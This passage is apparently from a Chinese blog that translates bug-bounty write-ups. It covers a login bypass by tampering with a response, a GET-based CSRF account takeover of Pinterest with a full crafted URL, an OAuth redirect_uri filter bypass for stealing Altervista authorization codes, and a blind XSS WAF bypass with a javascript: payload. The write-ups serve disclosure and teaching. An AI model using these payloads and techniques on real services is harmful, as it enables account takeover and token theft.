https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAME-HERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.htm&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=</div><div class="line">p3p: CP=&quot;NON CUR OTPi OUR NOR UNI&quot;</div><div class="line">Cache-Control: no-cache</div><div class="line">Pragma: no-cache</div><div class="line">Date: Sun, 04 Nov 2018 08:36:33 GMT</div><div class="line">Connection: close</div><div class="line">Set-Cookie: Cookies-here;</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;P&gt;&lt;A HREF=&quot;https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=&quot;&gt;Click here&lt;/A&gt; to fetch the resource.</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="然后我尝试使用未经验证的账号，以下是响应信息"><a href="#然后我尝试使用未经验证的账号，以下是响应信息" class="headerlink" title="然后我尝试使用未经验证的账号，以下是响应信息"></a>然后我尝试使用未经验证的账号，以下是响应信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily</div><div class="line">Content-Length: 1811</div><div class="line">Content-Type: text/html</div><div class="line">Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=help&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x13212079&amp;ERROR_TEXT=HPDIA0121W%20%20%20The%20requested%20operation%20is%20not%20valid.&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=</div><div class="line">Connection: close</div><div class="line">Set-Cookie: Cookies-here;</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;P&gt;&lt;A HREF=&quot;https://yolosite.com/rest/services/public/lrr?TAM_OP=help&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x13212079&amp;ERROR_TEXT=HPDIA0121W%20%20%20The%20requested%20operation%20is%20not%20valid.&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=&quot;&gt;Click here&lt;/A&gt; to fetch the resource.</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="现在我再次篡改了上述响应信息"><a href="#现在我再次篡改了上述响应信息" class="headerlink" title="现在我再次篡改了上述响应信息"></a>现在我再次篡改了上述响应信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily</div><div class="line">Content-Length: 1770</div><div class="line">Content-Type: text/html</div><div class="line">Location: https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAME-HERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.htm&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=</div><div class="line">p3p: CP=&quot;NON CUR OTPi OUR NOR UNI&quot;</div><div class="line">Cache-Control: no-cache</div><div class="line">Pragma: no-cache</div><div class="line">Date: Sun, 04 Nov 2018 08:36:33 GMT</div><div class="line">Connection: close</div><div class="line">Set-Cookie: Cookies-here;</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;P&gt;&lt;A HREF=&quot;https://yolosite.com/rest/services/public/lrr?TAM_OP=login_success&amp;USERNAME=USERNAMEHERE&amp;ERROR_CODE=0x38cf05e7&amp;ERROR_TEXT=DPWWA1511I%20%20%20Login%20successful&amp;URL=%2Fpkmslogin.form&amp;REFERER=https%3A%2F%2Fyolosite.com%2Fwfp%2Fen-it.html&amp;HOSTNAME=yolosite.com&amp;AUTHNLEVEL=&quot;&gt;Click here&lt;/A&gt; to fetch the resource.</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="一旦上述响应被转发我就成功登录到该账户，绕过了剩余的校验。"><a href="#一旦上述响应被转发我就成功登录到该账户，绕过了剩余的校验。" class="headerlink" title="一旦上述响应被转发我就成功登录到该账户，绕过了剩余的校验。"></a>一旦上述响应被转发我就成功登录到该账户，绕过了剩余的校验。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十八篇：CSRF导致账号接管]]></title>
      <url>/2019/02/16/%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AF%87%EF%BC%9ACSRF%E5%AF%BC%E8%87%B4%E8%B4%A6%E5%8F%B7%E6%8E%A5%E7%AE%A1/</url>
      <content type="html"><![CDATA[<h4 id="原文：How-I-could-have-taken-over-any-Pinterest-account"><a href="#原文：How-I-could-have-taken-over-any-Pinterest-account" class="headerlink" title="原文：How I could have taken over any Pinterest account"></a>原文：<a href="http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/" target="_blank" rel="external">How I could have taken over any Pinterest account</a></h4><h4 id="漏洞：GET请求绕过POST-CSRF-Token"><a href="#漏洞：GET请求绕过POST-CSRF-Token" class="headerlink" title="漏洞：GET请求绕过POST CSRF Token"></a>漏洞：GET请求绕过POST CSRF Token</h4><h4 id="作者：Arnold-Anthony"><a href="#作者：Arnold-Anthony" class="headerlink" title="作者：Arnold Anthony"></a>作者：<a href="http://infosecflash.com/about/" target="_blank" rel="external">Arnold Anthony</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h2 id="哪里有BUG？？"><a href="#哪里有BUG？？" class="headerlink" title="哪里有BUG？？"></a>哪里有BUG？？</h2><h4 id="emsp-emsp-当浏览”https-www-pinterest-com-quot-时，我发现CSRF-tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF-token的话，请求如下所示："><a href="#emsp-emsp-当浏览”https-www-pinterest-com-quot-时，我发现CSRF-tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF-token的话，请求如下所示：" class="headerlink" title="&emsp;&emsp;当浏览”https://www.pinterest.com&quot;时，我发现CSRF tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF token的话，请求如下所示："></a>&emsp;&emsp;当浏览”<a href="https://www.pinterest.com&quot;时，我发现CSRF" target="_blank" rel="external">https://www.pinterest.com&quot;时，我发现CSRF</a> tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF token的话，请求如下所示：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">POST /_ngjs/resource/UserSettingsResource/update/ HTTP/1.1</div><div class="line">Host: www.pinterest.com</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">X-CSRFToken: &lt;CSRF Token&gt;</div><div class="line">……..</div><div class="line">……..</div><div class="line">&lt;POST Parameters&gt;</div></pre></td></tr></table></figure>
<h4 id="1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error-“-resource-UserSettingsResource-update-didn’t-finish-after-8-seconds”，这意味着CSRF令牌正在进行验证"><a href="#1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error-“-resource-UserSettingsResource-update-didn’t-finish-after-8-seconds”，这意味着CSRF令牌正在进行验证" class="headerlink" title="1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error “/resource/UserSettingsResource/update/ didn’t finish after 8 seconds”，这意味着CSRF令牌正在进行验证"></a>1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error “/resource/UserSettingsResource/update/ didn’t finish after 8 seconds”，这意味着CSRF令牌正在进行验证</h4><h4 id="2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200-ok”"><a href="#2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200-ok”" class="headerlink" title="2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200 ok”"></a>2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200 ok”</h4><h2 id="账号接管"><a href="#账号接管" class="headerlink" title="账号接管"></a>账号接管</h2><h4 id="emsp-emsp-这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change-request-method”来转换）"><a href="#emsp-emsp-这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change-request-method”来转换）" class="headerlink" title="&emsp;&emsp;这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change request method”来转换）"></a>&emsp;&emsp;这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change request method”来转换）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.pinterest.com/_ngjs/resource/UserSettingsResource/update/?source_url=%2Fsettings%2F&amp;data=%7B%22options%22%3A%7B%22impressum_url%22%3Anull%2C%22last_name%22%3A%22dummy%22%2C%22custom_gender%22%3Anull%2C%22locale%22%3A%22en-US%22%2C%22has_password%22%3Atrue%2C%22email_settings%22%3A%22Everything+%28except+emails+you%27ve+turned+off%29%22%2C%22news_settings%22%3A%22Activity+from+other+people+on+Pinterest%22%2C%22id%22%3A%22%22%2C%22is_write_banned%22%3Afalse%2C%22first_name%22%3A%22dummyuser%22%2C%22push_settings%22%3A%22Everything+%28except+push+you%27ve+turned+off%29%22%2C%22personalize_from_offsite_browsing%22%3Atrue%2C%22facebook_timeline_enabled%22%3Afalse%2C%22email_changing_to%22%3Anull%2C%22personalize_nux_from_offsite_browsing%22%3Afalse%2C%22is_tastemaker%22%3Afalse%2C%22type%22%3A%22user_settings%22%2C%22email%22%3A%22anytestemail%40user.com%22%2C%22website_url%22%3A%22%22%2C%22location%22%3A%22%22%2C%22username%22%3A%22dummyuser%22%2C%22pfy_preference%22%3Atrue%2C%22facebook_publish_stream_enabled%22%3Afalse%2C%22email_bounced%22%3Afalse%2C%22is_partner%22%3Anull%2C%22ads_customize_from_conversion%22%3Atrue%2C%22additional_website_urls%22%3A%5B%5D%2C%22about%22%3A%22test%22%2C%22gender%22%3A%22male%22%2C%22age%22%3Anull%2C%22exclude_from_search%22%3Afalse%2C%22birthdate%22%3Anull%2C%22show_impressum%22%3Afalse%2C%22email_biz_settings%22%3A%22Everything+%28includes+announcements%2C+expert+tips%2C+creative+ideas%2C+and+more%29%22%2C%22country%22%3A%22IN%22%2C%22hide_from_news%22%3Afalse%2C%22collaborative_boards%22%3A%5B%5D%7D%2C%22context%22%3A%7B%7D%7D</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail-user-com”，重置了电子邮件之后我就能通过邮箱地址重置密码"><a href="#emsp-emsp-当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail-user-com”，重置了电子邮件之后我就能通过邮箱地址重置密码" class="headerlink" title="&emsp;&emsp;当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail@user.com”，重置了电子邮件之后我就能通过邮箱地址重置密码"></a>&emsp;&emsp;当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail@user.com”，重置了电子邮件之后我就能通过邮箱地址重置密码</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十七篇：盗取登陆令牌]]></title>
      <url>/2019/02/15/%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AF%87%EF%BC%9A%E7%9B%97%E5%8F%96%E7%99%BB%E9%99%86%E4%BB%A4%E7%89%8C/</url>
      <content type="html"><![CDATA[<h4 id="原文：How-I-hacked-Altervista-org"><a href="#原文：How-I-hacked-Altervista-org" class="headerlink" title="原文：How I hacked Altervista.org"></a>原文：<a href="https://medium.com/@jacopotediosi/how-i-hacked-altervista-org-f23d011cdb96" target="_blank" rel="external">How I hacked Altervista.org</a></h4><h4 id="漏洞：访问重定向窃取token"><a href="#漏洞：访问重定向窃取token" class="headerlink" title="漏洞：访问重定向窃取token"></a>漏洞：访问重定向窃取token</h4><h4 id="作者：Jacopo-Tediosi"><a href="#作者：Jacopo-Tediosi" class="headerlink" title="作者：Jacopo Tediosi"></a>作者：<a href="https://medium.com/@jacopotediosi" target="_blank" rel="external">Jacopo Tediosi</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h2 id="登陆系统的工作原理"><a href="#登陆系统的工作原理" class="headerlink" title="登陆系统的工作原理"></a>登陆系统的工作原理</h2><h4 id="emsp-emsp-在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击-“登录”-按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理"><a href="#emsp-emsp-在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击-“登录”-按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理" class="headerlink" title="&emsp;&emsp;在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击 “登录” 按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理"></a>&emsp;&emsp;在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击 “登录” 按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_17/1.png" alt=""></p>
<h4 id="emsp-emsp-这只是一个简单的链接"><a href="#emsp-emsp-这只是一个简单的链接" class="headerlink" title="&emsp;&emsp;这只是一个简单的链接"></a>&emsp;&emsp;这只是一个简单的链接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://aa.altervista.org/?client_id=altervista&amp;response_type=code&amp;redirect_uri=http://forum.it.altervista.org/</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-如果你已经经过身份认证了，那么该页面只会生成一个”authorization-code”并且将你重定向到-http-forum-it-altervista-org-login-php-do-login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA-3D-3D-amp-authorization-code-XXXXXXXXXXXXXXXXXXX"><a href="#emsp-emsp-如果你已经经过身份认证了，那么该页面只会生成一个”authorization-code”并且将你重定向到-http-forum-it-altervista-org-login-php-do-login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA-3D-3D-amp-authorization-code-XXXXXXXXXXXXXXXXXXX" class="headerlink" title="&emsp;&emsp;如果你已经经过身份认证了，那么该页面只会生成一个”authorization_code”并且将你重定向到 http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX"></a>&emsp;&emsp;如果你已经经过身份认证了，那么该页面只会生成一个”authorization_code”并且将你重定向到 <a href="http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX" target="_blank" rel="external">http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX</a></h4><h4 id="emsp-emsp-这个奇怪的参数-“do”-包含单词-“login”-，然后将”http-forum-it-altervista-org-forum-php“-编码为base64格式后添加在其后。"><a href="#emsp-emsp-这个奇怪的参数-“do”-包含单词-“login”-，然后将”http-forum-it-altervista-org-forum-php“-编码为base64格式后添加在其后。" class="headerlink" title="&emsp;&emsp;这个奇怪的参数 “do” 包含单词 “login” ，然后将”http://forum.it.altervista.org/forum.php“ 编码为base64格式后添加在其后。"></a>&emsp;&emsp;这个奇怪的参数 “do” 包含单词 “login” ，然后将”<a href="http://forum.it.altervista.org/forum.php" target="_blank" rel="external">http://forum.it.altervista.org/forum.php</a>“ 编码为base64格式后添加在其后。</h4><h4 id="emsp-emsp-参数”authorization-code”-包含之前生成的”authorization-code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向"><a href="#emsp-emsp-参数”authorization-code”-包含之前生成的”authorization-code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向" class="headerlink" title="&emsp;&emsp;参数”authorization_code” 包含之前生成的”authorization_code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向"></a>&emsp;&emsp;参数”authorization_code” 包含之前生成的”authorization_code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向</h4><h2 id="How-I-came-to-discover-the-vulnerability"><a href="#How-I-came-to-discover-the-vulnerability" class="headerlink" title="How I came to discover the vulnerability"></a>How I came to discover the vulnerability</h2><h4 id="emsp-emsp-这里存在的漏洞是如果我们能够修改”redirect-uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization-code（于是我们就能登录到他们的账号）"><a href="#emsp-emsp-这里存在的漏洞是如果我们能够修改”redirect-uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization-code（于是我们就能登录到他们的账号）" class="headerlink" title="&emsp;&emsp;这里存在的漏洞是如果我们能够修改”redirect_uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization_code（于是我们就能登录到他们的账号）"></a>&emsp;&emsp;这里存在的漏洞是如果我们能够修改”redirect_uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization_code（于是我们就能登录到他们的账号）</h4><h4 id="emsp-emsp-不幸的是网站似乎对URL提交的参数进行了过滤，它只接受-it-altervista-org-的子域。关于如何绕过，可以参考下面的视频："><a href="#emsp-emsp-不幸的是网站似乎对URL提交的参数进行了过滤，它只接受-it-altervista-org-的子域。关于如何绕过，可以参考下面的视频：" class="headerlink" title="&emsp;&emsp;不幸的是网站似乎对URL提交的参数进行了过滤，它只接受 it.altervista.org.的子域。关于如何绕过，可以参考下面的视频："></a>&emsp;&emsp;不幸的是网站似乎对URL提交的参数进行了过滤，它只接受 it.altervista.org.的子域。关于如何绕过，可以参考下面的<a href="https://youtu.be/0uejy9aCNbI" target="_blank" rel="external">视频</a>：</h4><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_17/shiping.mp4" type="video/mp4"><br></video>



<h4 id="emsp-emsp-视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。"><a href="#emsp-emsp-视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。" class="headerlink" title="&emsp;&emsp;视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。"></a>&emsp;&emsp;视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。</h4><h4 id="emsp-emsp-于是我开始Fuzzing，最后我终于找到绕过过滤器的方法："><a href="#emsp-emsp-于是我开始Fuzzing，最后我终于找到绕过过滤器的方法：" class="headerlink" title="&emsp;&emsp;于是我开始Fuzzing，最后我终于找到绕过过滤器的方法："></a>&emsp;&emsp;于是我开始Fuzzing，最后我终于找到绕过过滤器的方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://aa.altervista.org/?client_id=altervista&amp;response_type=code&amp;redirect_uri=http://google.it/http://it.altervista.org/</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_17/2.png" alt=""></p>
<h4 id="emsp-emsp-因此如果我们将我们的服务器地址放到这里而不是google-it，我们就可以窃取访问token了"><a href="#emsp-emsp-因此如果我们将我们的服务器地址放到这里而不是google-it，我们就可以窃取访问token了" class="headerlink" title="&emsp;&emsp;因此如果我们将我们的服务器地址放到这里而不是google.it，我们就可以窃取访问token了"></a>&emsp;&emsp;因此如果我们将我们的服务器地址放到这里而不是google.it，我们就可以窃取访问token了</h4><h4 id="emsp-emsp-拿到token就能直接登录了"><a href="#emsp-emsp-拿到token就能直接登录了" class="headerlink" title="&emsp;&emsp;拿到token就能直接登录了"></a>&emsp;&emsp;拿到token就能直接登录了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_17/3.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十六篇：盲注XSS]]></title>
      <url>/2019/02/15/%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AF%87%EF%BC%9A%E7%9B%B2%E6%B3%A8XSS/</url>
      <content type="html"><![CDATA[<h4 id="原文：Hack-Your-Form-–-New-vector-for-Blind-XSS"><a href="#原文：Hack-Your-Form-–-New-vector-for-Blind-XSS" class="headerlink" title="原文：Hack Your Form – New vector for Blind XSS"></a>原文：<a href="https://generaleg0x01.com/2019/01/13/hackyourform-bxss/" target="_blank" rel="external">Hack Your Form – New vector for Blind XSS</a></h4><h4 id="漏洞：绕过waf造成XSS"><a href="#漏洞：绕过waf造成XSS" class="headerlink" title="漏洞：绕过waf造成XSS"></a>漏洞：绕过waf造成XSS</h4><h4 id="作者：GeneralEG"><a href="#作者：GeneralEG" class="headerlink" title="作者：GeneralEG"></a>作者：<a href="https://generaleg0x01.com/author/GeneralEG/" target="_blank" rel="external">GeneralEG</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"><a href="#各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；" class="headerlink" title="各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"></a>各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；</h4><h4 id="我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"><a href="#我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。" class="headerlink" title="我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"></a>我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。</h4><h4 id="该服务是如何工作的呢？"><a href="#该服务是如何工作的呢？" class="headerlink" title="该服务是如何工作的呢？"></a>该服务是如何工作的呢？</h4><h4 id="1）用户创建表单"><a href="#1）用户创建表单" class="headerlink" title="1）用户创建表单"></a>1）用户创建表单</h4><h4 id="2）用户与访问者共享链接"><a href="#2）用户与访问者共享链接" class="headerlink" title="2）用户与访问者共享链接"></a>2）用户与访问者共享链接</h4><h4 id="3）访问者填写表格"><a href="#3）访问者填写表格" class="headerlink" title="3）访问者填写表格"></a>3）访问者填写表格</h4><h4 id="4）填写的信息将提交到-redacted-com-manager-Form-ID"><a href="#4）填写的信息将提交到-redacted-com-manager-Form-ID" class="headerlink" title="4）填写的信息将提交到 redacted.com/manager/{Form ID}/"></a>4）填写的信息将提交到 redacted.com/manager/{Form ID}/</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/1.jpg" alt=""></p>
<h4 id="表格创建好之后，我们使用访问者打开表格；"><a href="#表格创建好之后，我们使用访问者打开表格；" class="headerlink" title="表格创建好之后，我们使用访问者打开表格；"></a>表格创建好之后，我们使用访问者打开表格；</h4><h4 id="第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34"><a href="#第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34" class="headerlink" title="第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 https://example.com/?&quot;%22&amp;#34;"></a>第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 <a href="https://example.com/?&quot;%22&amp;#34" target="_blank" rel="external">https://example.com/?&quot;%22&amp;#34</a>;</h4><h4 id="然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“"><a href="#然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“" class="headerlink" title="然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https://example.com/?&quot;%22“"></a>然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了<a href="https://example.com/?&quot;%22" target="_blank" rel="external">https://example.com/?&quot;%22</a>“</h4><h4 id="注意（标签）中呈现的链接"><a href="#注意（标签）中呈现的链接" class="headerlink" title="注意（标签）中呈现的链接"></a>注意（标签）中呈现的链接</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/2.jpg" alt=""></p>
<h4 id="接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入"><a href="#接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入" class="headerlink" title="接着我尝试采用Fuzzing测试，当尝试 test:https://example.com时过滤器接受了这种输入"></a>接着我尝试采用Fuzzing测试，当尝试 test:<a href="https://example.com时过滤器接受了这种输入" target="_blank" rel="external">https://example.com时过滤器接受了这种输入</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/4.jpg" alt=""></p>
<h4 id="然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"><a href="#然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效" class="headerlink" title="然后又开始尝试javascript:https://evil.com 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"></a>然后又开始尝试javascript:<a href="https://evil.com" target="_blank" rel="external">https://evil.com</a> 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/5.gif" alt=""></p>
<h4 id="所以我重新构造的payload是"><a href="#所以我重新构造的payload是" class="headerlink" title="所以我重新构造的payload是"></a>所以我重新构造的payload是</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:x=&apos;http://x.c&apos;;alert(&apos;xss&apos;);//</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/6.jpg" alt=""></p>
